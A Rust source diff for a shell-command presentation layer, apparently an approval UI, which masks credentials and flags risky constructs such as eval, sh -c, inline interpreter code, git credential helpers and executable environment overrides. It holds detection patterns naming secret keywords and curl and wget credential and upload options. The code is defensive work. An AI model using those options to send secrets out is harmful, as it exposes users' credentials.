@@ -1,85 +1,122 @@
-//! Presentation only. Never used by policy, command identity, risk, grants, or execution.
+//! Observed command presentation only: never policy, risk, command identity, grants, or execution.
 //!
-//! The strict reader is a prerequisite, then a deliberately smaller reader preserves source spelling and operators.
-//! Unsupported input produces no shortened command. No shell, interpolation, or filesystem lookup is performed.
+//! This bounded display lexer deliberately does not require semantic certainty. A useful operation can be shown
+//! alongside explicit shell/side-effect limitations; the exact original remains the only authorization payload.
 use crate::types::CommandPresentation;
 
 const MAX_INPUT: usize = 32 * 1024;
 const MAX_DEPTH: usize = 2;
+const MAX_TOKENS: usize = 512;
+
+#[derive(Clone, Copy, Debug, PartialEq, Eq)]
+enum Kind {
+    Word,
+    Control,
+    Redirect,
+}
 
 #[derive(Debug)]
 struct Token<'a> {
     raw: &'a str,
     value: String,
-    start: usize,
+    kind: Kind,
+    dynamic: bool,
     end: usize,
 }
 
-/// Tokenize only the literal presentation subset. Strict reading has already checked the shell semantics.
+/// Observe spelling without expanding variables, resolving paths, or executing/interpreting a program.
 fn tokens(text: &str) -> Option<Vec<Token<'_>>> {
-    if !text.is_ascii() {
-        return None;
-    }
-    let bytes = text.as_bytes();
     let mut out = Vec::new();
     let mut i = 0;
-    while i < bytes.len() {
-        if matches!(bytes[i], b' ' | b'\t') {
+    while i < text.len() {
+        let ch = text[i..].chars().next()?;
+        if matches!(ch, ' ' | '\t' | '\r') {
             i += 1;
             continue;
         }
+        if ch.is_control() && ch != '\n' {
+            return None;
+        }
         let start = i;
-        if matches!(bytes[i], b';' | b'\n' | b'&' | b'|') {
-            i += 1;
-            if bytes.get(i) == Some(&bytes[start]) && matches!(bytes[start], b'&' | b'|') {
+        let rest = &text[i..];
+        let redir = ["&>>", "&>", "2>&1", "1>&2", "2>>", "1>>", "2>", "1>", ">>", "<<<", "<<", ">", "<"]
+            .into_iter()
+            .find(|op| rest.starts_with(op));
+        if let Some(op) = redir {
+            i += op.len();
+            out.push(Token {
+                raw: &text[start..i],
+                value: op.into(),
+                kind: Kind::Redirect,
+                dynamic: op.starts_with("<<"),
+                end: i,
+            });
+        } else if matches!(ch, ';' | '\n' | '&' | '|' | '(' | ')' | '{' | '}') {
+            i += ch.len_utf8();
+            if matches!(ch, '&' | '|') && text[i..].starts_with(ch) {
                 i += 1;
             }
             out.push(Token {
                 raw: &text[start..i],
-                value: text[start..i].to_owned(),
-                start,
+                value: text[start..i].into(),
+                kind: Kind::Control,
+                dynamic: matches!(ch, '(' | ')' | '{' | '}'),
                 end: i,
             });
-            continue;
-        }
-        let mut value = String::new();
-        while i < bytes.len() && !matches!(bytes[i], b' ' | b'\t' | b'\n' | b';' | b'&' | b'|') {
-            match bytes[i] {
-                // Redirections, comments, heredocs, and shell expansion retain the full invocation on fallback.
-                b'<' | b'>' | b'#' | b'$' | b'`' | b'(' | b')' | b'{' | b'}' => return None,
-                quote @ (b'\'' | b'"') => {
+        } else if ch == '#' {
+            // A comment remains visible; its words must never become claimed executable actions.
+            i = text[i..].find('\n').map_or(text.len(), |at| i + at);
+            out.push(Token {
+                raw: &text[start..i],
+                value: text[start..i].into(),
+                kind: Kind::Control,
+                dynamic: true,
+                end: i,
+            });
+        } else {
+            let mut value = String::new();
+            let mut quote = None;
+            let mut dynamic = false;
+            while i < text.len() {
+                let c = text[i..].chars().next()?;
+                if quote.is_none()
+                    && matches!(c, ' ' | '\t' | '\r' | '\n' | ';' | '&' | '|' | '<' | '>' | '(' | ')' | '{' | '}')
+                {
+                    break;
+                }
+                if c.is_control() && !matches!(c, '\n' | '\t') {
+                    return None;
+                }
+                if matches!(c, '\'' | '"') && (quote.is_none() || quote == Some(c)) {
+                    quote = if quote == Some(c) {
+                        None
+                    } else {
+                        Some(c)
+                    };
                     i += 1;
-                    while i < bytes.len() && bytes[i] != quote {
-                        if quote == b'"' && matches!(bytes[i], b'$' | b'`' | b'\\') {
-                            return None;
-                        }
-                        value.push(char::from(bytes[i]));
-                        i += 1;
+                } else if c == '\\' && quote != Some('\'') {
+                    i += 1;
+                    let next = text[i..].chars().next()?;
+                    if next != '\n' {
+                        value.push(next);
                     }
-                    if i == bytes.len() {
-                        return None;
-                    }
-                    i += 1;
+                    i += next.len_utf8();
+                } else {
+                    dynamic |= quote != Some('\'') && matches!(c, '$' | '`');
+                    value.push(c);
+                    i += c.len_utf8();
                 }
-                b'\\' => {
-                    i += 1;
-                    value.push(char::from(*bytes.get(i)?));
-                    i += 1;
-                }
-                byte if byte.is_ascii() => {
-                    value.push(char::from(byte));
-                    i += 1;
-                }
-                _ => return None,
             }
+            dynamic |= quote.is_some();
+            out.push(Token {
+                raw: &text[start..i],
+                value,
+                kind: Kind::Word,
+                dynamic,
+                end: i,
+            });
         }
-        out.push(Token {
-            raw: &text[start..i],
-            value,
-            start,
-            end: i,
-        });
-        if out.len() > 512 {
+        if out.len() > MAX_TOKENS {
             return None;
         }
     }
@@ -93,38 +130,761 @@ fn assignment(word: &str) -> Option<&str> {
         && name.chars().all(|c| c.is_ascii_alphanumeric() || c == '_'))
     .then_some(name)
 }
-
 fn program(word: &str) -> &str {
     word.rsplit('/').next().unwrap_or(word)
 }
-
 fn shell_spelling(word: &str) -> bool {
     let name = word.strip_prefix("/bin/").or_else(|| word.strip_prefix("/usr/bin/")).unwrap_or(word);
     ["sh", "bash", "zsh", "dash", "ksh"].contains(&name)
 }
+fn notice(out: &mut CommandPresentation, value: impl Into<String>) {
+    let value = value.into();
+    if !out.notices.contains(&value) {
+        out.notices.push(value);
+    }
+}
+fn sensitive(name: &str) -> bool {
+    let name = name.to_ascii_lowercase();
+    [
+        "password",
+        "passwd",
+        "token",
+        "secret",
+        "credential",
+        "authorization",
+        "api_key",
+        "apikey",
+        "private_key",
+        "keypass",
+    ]
+    .iter()
+    .any(|part| name.contains(part))
+}
+fn concealed(word: &str) -> String {
+    format!("{}=••••", word.split_once('=').map_or(word, |(name, _)| name))
+}
+/// Conceal URL userinfo anywhere in a displayed source fragment, including quoted arguments and redirects.
+fn conceal_url_userinfo(source: &str) -> String {
+    let mut result = source.to_owned();
+    let mut from = 0;
+    while let Some(at) = result[from..].find("://") {
+        let begin = from + at + 3;
+        let end = result[begin..].find(['/', '?', '#', ' ', '\t', '\n', '\'', '"']).map_or(result.len(), |n| begin + n);
+        if let Some(at) = result[begin..end].rfind('@') {
+            result.replace_range(begin..begin + at, "••••");
+            from = begin + "••••".len() + 1;
+        } else {
+            from = end;
+        }
+    }
+    result
+}
+
+const MAX_SOURCE_DEPTH: usize = 8;
+
+#[derive(Clone, Copy)]
+enum ArgumentKind {
+    Secret,
+    Header,
+}
+/// Curl short switches may be clustered until a value-taking option consumes the remaining spelling.
+fn curl_short(word: &str) -> Option<(&str, &str, ArgumentKind)> {
+    if !word.starts_with('-') || word.starts_with("--") {
+        return None;
+    }
+    for (at, ch) in word.char_indices().skip(1) {
+        let kind = match ch {
+            'u' | 'U' | 'b' => Some(ArgumentKind::Secret),
+            'H' => Some(ArgumentKind::Header),
+            _ => None,
+        };
+        if let Some(kind) = kind {
+            return Some((&word[..=at], &word[at + 1..], kind));
+        }
+        // Only documented switches without operands may precede the credential option. Never scan through an
+        // unknown/value-taking option, whose apparent credential suffix may actually be a file/output target.
+        // Operand-free short forms listed by `curl --help all`, including protocol/address-family switches.
+        if !"aqfGgI0k46jlLMn:NZ#pJORSis231BvV".contains(ch) {
+            return None;
+        }
+    }
+    None
+}
+
+fn executable_env(name: &str) -> bool {
+    matches!(name, "GIT_SSH_COMMAND" | "GIT_ASKPASS" | "SSH_ASKPASS" | "GIT_EDITOR" | "GIT_SEQUENCE_EDITOR")
+}
+fn executable_git_config(name: &str) -> bool {
+    // Git accepts both `-c key=value` and `-ckey=value`.
+    let name = name.strip_prefix("-c").unwrap_or(name).to_ascii_lowercase();
+    matches!(name.as_str(), "credential.helper" | "core.sshcommand" | "core.editor" | "core.pager" | "sequence.editor")
+        || name.starts_with("alias.")
+}
+fn foreign_inline<'a>(tool: &str, word: &'a str, previous: &str) -> Option<&'a str> {
+    if (matches!(tool, "python" | "python3") && previous == "-c")
+        || (matches!(tool, "node" | "ruby" | "perl") && matches!(previous, "-e" | "--eval" | "-E"))
+    {
+        return Some("");
+    }
+    let prefixes: &[&str] = match tool {
+        "python" | "python3" => &["-c"],
+        "node" => &["--eval=", "-e"],
+        "ruby" | "perl" => &["-e"],
+        _ => &[],
+    };
+    prefixes.iter().find(|p| word.starts_with(**p) && word.len() > p.len()).map(|p| &word[..p.len()])
+}
+fn option_kind(tool: &str, name: &str) -> Option<ArgumentKind> {
+    if matches!(name, "--password" | "--token" | "--secret" | "--credentials" | "--api-key" | "--authorization") {
+        return Some(ArgumentKind::Secret);
+    }
+    match tool.trim_start_matches('!') {
+        "curl"
+            if matches!(
+                name,
+                "-u" | "--user" | "-U" | "--proxy-user" | "--oauth2-bearer" | "--pass" | "-b" | "--cookie"
+            ) =>
+        {
+            Some(ArgumentKind::Secret)
+        }
+        "curl" if matches!(name, "-H" | "--header" | "--proxy-header") => Some(ArgumentKind::Header),
+        "curl" => curl_short(name).filter(|(_, value, _)| value.is_empty()).map(|(_, _, kind)| kind),
+        "wget"
+            if matches!(
+                name,
+                "--user"
+                    | "--http-user"
+                    | "--ftp-user"
+                    | "--proxy-user"
+                    | "--http-password"
+                    | "--ftp-password"
+                    | "--proxy-password"
+            ) =>
+        {
+            Some(ArgumentKind::Secret)
+        }
+        "wget" if name == "--header" => Some(ArgumentKind::Header),
+        _ => None,
+    }
+}
+fn expression_ranges(source: &str) -> Vec<(usize, usize)> {
+    let mut expressions = Vec::new();
+    let bytes = source.as_bytes();
+    let mut i = 0;
+    while i < bytes.len() {
+        if !matches!(bytes[i], b'$' | b'`') {
+            i += 1;
+            continue;
+        }
+        let start = i;
+        let marker = bytes[i];
+        i += 1;
+        if marker == b'`' {
+            while i < bytes.len() {
+                if bytes[i] == b'\\' {
+                    i = (i + 2).min(bytes.len());
+                } else if bytes[i] == b'`' {
+                    i += 1;
+                    break;
+                } else {
+                    i += 1;
+                }
+            }
+        } else if matches!(bytes.get(i), Some(b'(' | b'{')) {
+            let open = bytes[i];
+            let close = if open == b'(' {
+                b')'
+            } else {
+                b'}'
+            };
+            let mut depth = 1;
+            let mut quote = None;
+            i += 1;
+            while i < bytes.len() && depth > 0 {
+                if bytes[i] == b'\\' && quote != Some(b'\'') {
+                    i = (i + 2).min(bytes.len());
+                    continue;
+                }
+                if matches!(bytes[i], b'\'' | b'"' | b'`') && (quote.is_none() || quote == Some(bytes[i])) {
+                    quote = if quote == Some(bytes[i]) {
+                        None
+                    } else {
+                        Some(bytes[i])
+                    };
+                } else if quote.is_none() && bytes[i] == open {
+                    depth += 1;
+                } else if quote.is_none() && bytes[i] == close {
+                    depth -= 1;
+                }
+                i += 1;
+            }
+        } else {
+            while i < bytes.len() && (bytes[i].is_ascii_alphanumeric() || bytes[i] == b'_') {
+                i += 1;
+            }
+        }
+        while i < bytes.len() && !source.is_char_boundary(i) {
+            i += 1;
+        }
+        expressions.push((start, i));
+    }
+    expressions
+}
+fn expression_display(source: &str, level: usize) -> String {
+    if level > MAX_SOURCE_DEPTH {
+        return "[nested executable source omitted; inspect original]".into();
+    }
+    if let Some(body) = source.strip_prefix("$(").and_then(|s| s.strip_suffix(')')) {
+        format!("$({})", redact_source(body, level + 1))
+    } else if let Some(body) = source.strip_prefix('`').and_then(|s| s.strip_suffix('`')) {
+        format!("`{}`", redact_source(body, level + 1))
+    } else if let Some(body) = source.strip_prefix("${").and_then(|s| s.strip_suffix('}')) {
+        format!("${{{}}}", redact_source(body, level + 1))
+    } else {
+        conceal_url_userinfo(source)
+    }
+}
+/// Conceal literal credential data while retaining bounded, recursively redacted executable source.
+fn credential_expression_at(source: &str, level: usize) -> String {
+    let expressions: Vec<_> = expression_ranges(source)
+        .into_iter()
+        .map(|(start, end)| expression_display(&source[start..end], level + 1))
+        .collect();
+    if expressions.is_empty() {
+        "•••• [unverified dynamic value; inspect original]".into()
+    } else {
+        format!("•••• [observed shell source: {}]", expressions.join(" "))
+    }
+}
+fn dynamic_source(source: &str, level: usize) -> String {
+    let mut out = String::new();
+    let mut from = 0;
+    for (start, end) in expression_ranges(source) {
+        out.push_str(&source[from..start]);
+        out.push_str(&expression_display(&source[start..end], level + 1));
+        from = end;
+    }
+    out.push_str(&source[from..]);
+    conceal_url_userinfo(&out)
+}
+fn dynamic_assignment_at(token: &Token<'_>, level: usize) -> String {
+    let (name, value) = token.raw.split_once('=').unwrap_or(("dynamic value", token.raw));
+    format!("{name}={}", credential_expression_at(value, level + 1))
+}
+fn dynamic_assignment(token: &Token<'_>) -> String {
+    dynamic_assignment_at(token, 0)
+}
+fn header_name(name: &str) -> bool {
+    !name.is_empty() && name.bytes().all(|c| c.is_ascii_alphanumeric() || b"!#$%&'*+-.^_`|~".contains(&c))
+}
+fn argument_value(kind: ArgumentKind, value: &str, raw: &str, dynamic: bool, level: usize) -> String {
+    match kind {
+        ArgumentKind::Secret => {
+            if dynamic {
+                credential_expression_at(raw, level + 1)
+            } else {
+                "••••".into()
+            }
+        }
+        ArgumentKind::Header => {
+            if let Some((name, _)) = value.split_once(':')
+                && (header_name(name)
+                    && (sensitive(name)
+                        || matches!(name.trim().to_ascii_lowercase().as_str(), "cookie" | "set-cookie")))
+            {
+                format!(
+                    "{name}: {}",
+                    if dynamic {
+                        credential_expression_at(raw, level + 1)
+                    } else {
+                        "••••".into()
+                    }
+                )
+            } else if dynamic {
+                dynamic_source(raw, level + 1)
+            } else {
+                conceal_url_userinfo(raw)
+            }
+        }
+    }
+}
+fn inline_argument(tool: &str, token: &Token<'_>, level: usize) -> Option<String> {
+    if let Some((name, value)) = token.value.split_once('=')
+        && let Some(kind) = option_kind(tool, name)
+    {
+        let raw = token.raw.split_once('=').map_or(value, |(_, v)| v);
+        return Some(format!("{name}={}", argument_value(kind, value, raw, token.dynamic, level + 1)));
+    }
+    if tool.trim_start_matches('!') == "curl"
+        && let Some((prefix, value, kind)) = curl_short(&token.value).filter(|(_, value, _)| !value.is_empty())
+    {
+        let raw = token.raw.strip_prefix(prefix).unwrap_or(value);
+        return Some(format!("{prefix}{}", argument_value(kind, value, raw, token.dynamic, level + 1)));
+    }
+    None
+}
+fn executable_value(name: &str, value: &str, level: usize) -> String {
+    format!("{name}=⟪executable source: {}⟫", redact_source(value, level + 1))
+}
+fn argument_display(tool: &str, token: &Token<'_>, level: usize) -> String {
+    if let Some((name, value)) = token.value.split_once('=')
+        && (executable_env(name) || (tool.trim_start_matches('!') == "git" && executable_git_config(name)))
+    {
+        return executable_value(name, value, level + 1);
+    }
+    inline_argument(tool, token, level + 1).unwrap_or_else(|| shown_at(token, level + 1))
+}
+/// Redact observed shell source without folding any command, option, operator, or executable configuration.
+fn redact_source(source: &str, level: usize) -> String {
+    if level > MAX_SOURCE_DEPTH {
+        return "[nested executable source omitted; inspect original]".into();
+    }
+    let Some(ts) = tokens(source) else {
+        return "[unparsed executable source omitted; inspect original]".into();
+    };
+    let mut out = String::new();
+    let mut from = 0;
+    let mut tool = "";
+    let mut next = None;
+    for (i, token) in ts.iter().enumerate() {
+        let start = token.end - token.raw.len();
+        out.push_str(&source[from..start]);
+        let displayed = if token.kind != Kind::Word {
+            if token.kind == Kind::Control {
+                tool = "";
+                next = None;
+            }
+            token.raw.into()
+        } else if !tool.is_empty()
+            && (tool == "eval"
+                || (matches!(tool, "sh" | "bash" | "zsh" | "dash" | "ksh")
+                    && i > 0
+                    && matches!(ts[i - 1].value.as_str(), "-c" | "-lc")))
+        {
+            format!("⟪executable shell source: {}⟫", redact_source(&token.value, level + 1))
+        } else if let Some(prefix) = foreign_inline(
+            tool,
+            &token.value,
+            if i > 0 {
+                &ts[i - 1].value
+            } else {
+                ""
+            },
+        ) {
+            format!("{prefix}[inline code omitted; inspect original]")
+        } else if let Some(kind) = next.take() {
+            argument_value(kind, &token.value, token.raw, token.dynamic, level + 1)
+        } else {
+            if (tool.is_empty() || (tool == "env" && !token.value.starts_with('-')))
+                && assignment(&token.value).is_none()
+            {
+                tool = program(&token.value).trim_start_matches('!');
+            }
+            next = option_kind(tool, &token.value);
+            argument_display(tool, token, level + 1)
+        };
+        out.push_str(&displayed);
+        from = token.end;
+    }
+    out.push_str(&source[from..]);
+    conceal_url_userinfo(&out)
+}
+fn shown_at(token: &Token<'_>, level: usize) -> String {
+    if let Some((name, _)) = token.value.split_once(':')
+        && (header_name(name)
+            && (sensitive(name) || matches!(name.trim().to_ascii_lowercase().as_str(), "cookie" | "set-cookie")))
+    {
+        return argument_value(ArgumentKind::Header, &token.value, token.raw, token.dynamic, level + 1);
+    }
+    if let Some((name, value)) = token.value.split_once('=') {
+        if executable_env(name) {
+            return executable_value(name, value, level + 1);
+        }
+        if sensitive(name) {
+            if token.dynamic {
+                return dynamic_assignment_at(token, level + 1);
+            }
+            if token.value.contains([';', '\n']) || token.value.contains("&&") || token.value.contains("||") {
+                return format!("{name}=•••• [unclassified argument/source omitted; inspect original]");
+            }
+            return concealed(&token.value);
+        }
+    }
+    if token.dynamic {
+        dynamic_source(token.raw, level + 1)
+    } else {
+        conceal_url_userinfo(token.raw)
+    }
+}
+fn shown(token: &Token<'_>) -> String {
+    shown_at(token, 0)
+}
 
 fn fallback(command: &str) -> CommandPresentation {
     CommandPresentation {
-        heading: "Review a shell command".into(),
-        notices: vec!["Reins cannot safely shorten this invocation. Inspect the full invocation, including its setup and shell syntax.".into()],
+        heading: "Review a shell invocation".into(),
+        notices: vec![
+            "A compact observed summary is unavailable. Inspect the original invocation and all of its effects.".into(),
+        ],
         original: command.to_owned(),
         ..CommandPresentation::default()
     }
 }
 
-/// The smaller display reader only peels literal leading assignments, plain `env`, an exact shell wrapper, and
-/// leading `cd path &&`. Everything else stays actionable, including privilege-changing wrappers.
+/// Literal configuration is compact, but it is never described as harmless or ignored by execution/risk.
+fn build_option(tool: &str, word: &str) -> bool {
+    match tool {
+        "gradle" | "gradlew" => {
+            word.starts_with("-P")
+                || word.starts_with("-D")
+                || matches!(
+                    word,
+                    "--no-daemon"
+                        | "--daemon"
+                        | "--no-configuration-cache"
+                        | "--configuration-cache"
+                        | "--stacktrace"
+                        | "--full-stacktrace"
+                        | "--info"
+                        | "--debug"
+                        | "--quiet"
+                        | "--offline"
+                        | "--console=plain"
+                        | "--console=auto"
+                )
+        }
+        "mvn" | "mvnw" => {
+            word.starts_with("-D") || matches!(word, "-B" | "--batch-mode" | "-q" | "--quiet" | "-e" | "--errors")
+        }
+        "cargo" => matches!(word, "--release" | "--locked" | "--offline" | "--quiet" | "--verbose"),
+        "make" | "gmake" => assignment(word).is_some() || (word.starts_with("-j") && word.len() > 2),
+        _ => false,
+    }
+}
+fn build(tool: &str) -> bool {
+    matches!(
+        tool,
+        "gradle"
+            | "gradlew"
+            | "mvn"
+            | "mvnw"
+            | "cargo"
+            | "make"
+            | "gmake"
+            | "cmake"
+            | "ninja"
+            | "npm"
+            | "pnpm"
+            | "yarn"
+            | "bun"
+            | "npx"
+            | "uv"
+            | "poetry"
+    )
+}
+fn gradle_heading(tasks: &[&str]) -> String {
+    let task_names: Vec<_> = tasks.iter().map(|t| t.rsplit(':').next().unwrap_or(t)).collect();
+    if !task_names.is_empty()
+        && task_names
+            .iter()
+            .all(|t| t.starts_with("assemble") && (t.ends_with("Release") || t.ends_with("ReleaseAndroidTest")))
+    {
+        let tests = task_names.iter().any(|t| t.ends_with("AndroidTest"));
+        let app = task_names.iter().any(|t| !t.ends_with("AndroidTest"));
+        return match (app, tests) {
+            (true, true) => "Build Android release and test APKs",
+            (true, false) => "Build Android release APKs",
+            _ => "Build Android release test APKs",
+        }
+        .into();
+    }
+    if !task_names.is_empty() && task_names.iter().all(|t| t.starts_with("assemble") && t.contains("Debug")) {
+        return "Build Android debug APKs".into();
+    }
+    format!(
+        "Run Gradle tasks: {}",
+        if tasks.is_empty() {
+            "default".into()
+        } else {
+            tasks.join(" ")
+        }
+    )
+}
+fn heading(tool: &str, args: &[&str]) -> String {
+    if tool.is_empty() {
+        return "Redirect shell input/output".into();
+    }
+    if tool.contains('=') {
+        return format!("Run command named {} (value concealed)", concealed(tool));
+    }
+    let operands: Vec<_> = args.iter().copied().filter(|a| !a.starts_with('-')).collect();
+    let first = operands.first().copied().unwrap_or_default();
+    match (tool, first) {
+        ("gradle" | "gradlew", _) => gradle_heading(&operands),
+        ("cargo", "build" | "check" | "test" | "clippy" | "fmt") => match first {
+            "build" => "Build Rust project",
+            "check" => "Check Rust project",
+            "test" => "Run Rust tests",
+            "clippy" => "Lint Rust project",
+            _ => "Format Rust source",
+        }
+        .into(),
+        ("npm" | "pnpm" | "yarn" | "bun", "run") => {
+            format!("Run {tool} script: {}", operands.get(1).unwrap_or(&"default"))
+        }
+        ("make" | "gmake" | "ninja", _) => format!(
+            "Run {tool} targets: {}",
+            if operands.is_empty() {
+                "default".into()
+            } else {
+                operands.join(" ")
+            }
+        ),
+        ("mvn" | "mvnw", _) => format!("Run Maven goals: {}", operands.join(" ")),
+        ("cmake", _) if args.contains(&"--build") => "Build CMake project".into(),
+        ("rm" | "rmdir", _) => format!("Delete files: {}", operands.join(" ")),
+        ("cp", _) => format!("Copy files: {}", operands.join(" ")),
+        ("mv", _) => format!("Move files: {}", operands.join(" ")),
+        ("git", _) => format!("Run Git: {}", operands.join(" ")),
+        ("curl" | "wget", _) => {
+            let target = operands
+                .iter()
+                .find(|a| a.starts_with("https://") || a.starts_with("http://"))
+                .copied()
+                .unwrap_or("the specified target");
+            let sends = args
+                .iter()
+                .any(|a| matches!(*a, "--upload-file" | "-T" | "--data" | "--data-binary" | "-d" | "-F" | "--form"));
+            format!(
+                "{} with {tool}: {target}",
+                if sends {
+                    "Send data"
+                } else {
+                    "Request"
+                }
+            )
+        }
+        _ => format!(
+            "Run {tool}{}",
+            if first.is_empty() {
+                String::new()
+            } else {
+                format!(": {first}")
+            }
+        ),
+    }
+}
+
+fn redirects(tokens: &[Token<'_>], out: &mut CommandPresentation) {
+    for (i, token) in tokens.iter().enumerate().filter(|(_, t)| t.kind == Kind::Redirect) {
+        let target =
+            tokens.get(i + 1).filter(|t| t.kind == Kind::Word).map_or_else(|| "(inspect original)".into(), shown);
+        let message = match token.raw {
+            "2>&1" => "Standard error joins standard output (2>&1).".into(),
+            "1>&2" => "Standard output joins standard error (1>&2).".into(),
+            ">>" | "1>>" | "2>>" | "&>>" => format!("Appends redirected output to {target} ({}).", token.raw),
+            ">" | "1>" | "2>" | "&>" => format!("Redirected output replaces {target} ({}).", token.raw),
+            "<" => format!("Reads standard input from {target} (<)."),
+            _ => "Here-document or shell input expression is present; inspect its complete contents.".into(),
+        };
+        notice(out, message);
+    }
+}
+
+fn segment(tokens: &[Token<'_>], out: &mut CommandPresentation) -> (String, String) {
+    let mut rendered = Vec::new();
+    let mut args = Vec::new();
+    let mut options = Vec::new();
+    let mut tool = "";
+    let mut skip_target = false;
+    let mut option_values = true;
+    let mut hide_next = None;
+    let mut inline_code = false;
+    for (i, token) in tokens.iter().enumerate() {
+        if token.kind == Kind::Redirect {
+            rendered.push(token.raw.into());
+            skip_target = !matches!(token.raw, "2>&1" | "1>&2");
+            continue;
+        }
+        if skip_target {
+            rendered.push(shown(token));
+            skip_target = false;
+            continue;
+        }
+        if tool.is_empty() && assignment(&token.value).is_some_and(|name| token.raw.starts_with(&format!("{name}="))) {
+            let name = assignment(&token.value).unwrap_or_default();
+            if executable_env(name) {
+                rendered.push(argument_display(tool, token, 0));
+                notice(
+                    out,
+                    "An executable environment override is supplied; its commands can run as part of this action.",
+                );
+            } else {
+                rendered.push(if token.dynamic {
+                    dynamic_assignment(token)
+                } else {
+                    concealed(&token.value)
+                });
+            }
+            continue;
+        }
+        if tool.is_empty() {
+            tool = program(&token.value);
+            rendered.push(if token.dynamic {
+                shown(token)
+            } else if token.value.contains('=') {
+                concealed(&token.value)
+            } else {
+                shown(token)
+            });
+            continue;
+        }
+        if matches!(tool, "env" | "sudo" | "doas") && token.value.contains('=') && !token.value.starts_with('-') {
+            let name = token.value.split_once('=').map_or("", |(name, _)| name);
+            let redacted = if executable_env(name) {
+                notice(
+                    out,
+                    "An executable environment override is supplied; its commands can run as part of this action.",
+                );
+                argument_display(tool, token, 0)
+            } else if token.dynamic {
+                dynamic_assignment(token)
+            } else {
+                concealed(&token.value)
+            };
+            args.push(redacted.clone());
+            rendered.push(redacted);
+            continue;
+        }
+        let previous = i.checked_sub(1).map(|at| tokens[at].value.as_str()).unwrap_or_default();
+        if tool == "eval"
+            || (matches!(tool, "sh" | "bash" | "zsh" | "dash" | "ksh") && matches!(previous, "-c" | "-lc"))
+        {
+            rendered.push(format!("⟪executable shell source: {}⟫", redact_source(&token.value, 0)));
+            notice(out, "This action executes supplied shell code; inspect every action and its positional arguments.");
+            inline_code = true;
+            continue;
+        }
+        if option_values && let Some(prefix) = foreign_inline(tool, &token.value, previous) {
+            rendered.push(format!("{prefix}[inline code omitted; inspect original]"));
+            notice(
+                out,
+                "Inline interpreter code is not summarized. Inspect the original code; additional effects and credentials may be present.",
+            );
+            inline_code = true;
+            continue;
+        }
+        if let Some(kind) = hide_next.take() {
+            rendered.push(argument_value(kind, &token.value, token.raw, token.dynamic, 0));
+            continue;
+        }
+        if option_values && let Some(kind) = option_kind(tool, &token.value) {
+            rendered.push(token.raw.into());
+            hide_next = Some(kind);
+            continue;
+        }
+        if option_values && let Some(redacted) = inline_argument(tool, token, 0) {
+            rendered.push(redacted);
+            continue;
+        }
+        if tool == "git" && token.value.split_once('=').is_some_and(|(name, _)| executable_git_config(name)) {
+            notice(
+                out,
+                "Git executable configuration is supplied; its helper or alias commands can run as part of this action.",
+            );
+        }
+        // An option's separate operand is not a task, even when its spelling resembles one.
+        let is_value = i > 0
+            && matches!(
+                tokens[i - 1].value.as_str(),
+                "-p" | "--project-dir"
+                    | "-b"
+                    | "--build-file"
+                    | "-c"
+                    | "--settings-file"
+                    | "-I"
+                    | "--init-script"
+                    | "-g"
+                    | "--gradle-user-home"
+                    | "--max-workers"
+                    | "--console"
+                    | "--warning-mode"
+                    | "--manifest-path"
+                    | "--target"
+                    | "--features"
+                    | "--package"
+                    | "-C"
+                    | "--prefix"
+            );
+        if option_values && token.dynamic && token.value.contains('=') && build_option(tool, &token.value) {
+            rendered.push(dynamic_assignment(token));
+            continue;
+        }
+        if option_values && !token.dynamic && build_option(tool, &token.value) {
+            let property =
+                token.value.starts_with("-P") || token.value.starts_with("-D") || assignment(&token.value).is_some();
+            options.push(if property && token.value.contains('=') {
+                concealed(&token.value)
+            } else {
+                shown(token)
+            });
+            continue;
+        }
+        if token.value == "--" {
+            option_values = false;
+        }
+        if !is_value {
+            let redacted = argument_display(tool, token, 0);
+            args.push(if redacted == token.raw {
+                token.value.clone()
+            } else {
+                redacted
+            });
+        }
+        rendered.push(argument_display(tool, token, 0));
+    }
+    if matches!(tool, "sudo" | "doas" | "su") {
+        notice(out, "This invocation requests a different user or elevated privileges; inspect its exact options.");
+    }
+    if tokens
+        .iter()
+        .any(|t| t.value.to_ascii_lowercase().contains("keystore") || t.value.to_ascii_lowercase().contains("signing"))
+        && build(tool)
+    {
+        notice(out, "References signing configuration or a signing key; no read or signature is proven.");
+    }
+    if !options.is_empty() {
+        out.setup.push(format!("{tool} options/configuration ({}): {}", options.len(), options.join(" ")));
+    }
+    redirects(tokens, out);
+    if build(tool) {
+        notice(
+            out,
+            if matches!(tool, "gradle" | "gradlew") {
+                "Gradle runs project build scripts/plugins. Options and properties can change behavior and use this process's permissions and credentials."
+            } else {
+                "Build tools run project scripts/plugins. Options and properties can change behavior and use this process's permissions and credentials."
+            },
+        );
+    }
+    let title = if inline_code {
+        format!("Run inline {tool} code (inspect original)")
+    } else {
+        heading(tool, &args.iter().map(String::as_str).collect::<Vec<_>>())
+    };
+    (title, rendered.join(" "))
+}
+
 fn read(text: &str, depth: usize, out: &mut CommandPresentation) -> Option<()> {
     if depth > MAX_DEPTH {
         return None;
     }
     let toks = tokens(text)?;
     let mut start = 0;
-    while let Some(t) = toks.get(start) {
+    while let Some(t) = toks.get(start).filter(|t| t.kind == Kind::Word) {
         if let Some(name) = assignment(&t.value) {
-            // Quoting/escaping the name can turn a shell assignment into a program name. Never peel that spelling.
-            if !t.raw.starts_with(&format!("{name}=")) {
-                return None;
+            if t.dynamic || executable_env(name) || !t.raw.starts_with(&format!("{name}=")) {
+                break;
             }
             out.setup.push(format!("{name}=•••• (value hidden)"));
             if matches!(
@@ -143,19 +903,19 @@ fn read(text: &str, depth: usize, out: &mut CommandPresentation) -> Option<()> {
                     | "NODE_OPTIONS"
                     | "PYTHONPATH"
             ) {
-                out.notices.push(format!(
-                    "{name} changes executable resolution or runtime behavior. Inspect its value before approving."
-                ));
+                notice(
+                    out,
+                    format!(
+                        "{name} changes executable resolution or runtime behavior. Inspect its value before approving."
+                    ),
+                );
             }
             start += 1;
-        } else if t.value == "env" || t.value == "/usr/bin/env" {
-            // Options such as --chdir, -i and -u remain in the actionable command, with their effects intact.
-            if toks.get(start + 1).is_some_and(|next| assignment(&next.value).is_some()) {
-                out.setup.push(format!("Environment wrapper: {}", t.raw));
-                start += 1;
-            } else {
-                break;
-            }
+        } else if matches!(t.value.as_str(), "env" | "/usr/bin/env")
+            && toks.get(start + 1).is_some_and(|next| assignment(&next.value).is_some())
+        {
+            out.setup.push(format!("Environment wrapper: {}", t.raw));
+            start += 1;
         } else {
             break;
         }
@@ -164,82 +924,446 @@ fn read(text: &str, depth: usize, out: &mut CommandPresentation) -> Option<()> {
     if shell_spelling(&first.value)
         && toks.get(start + 1).is_some_and(|t| matches!(t.value.as_str(), "-c" | "-lc"))
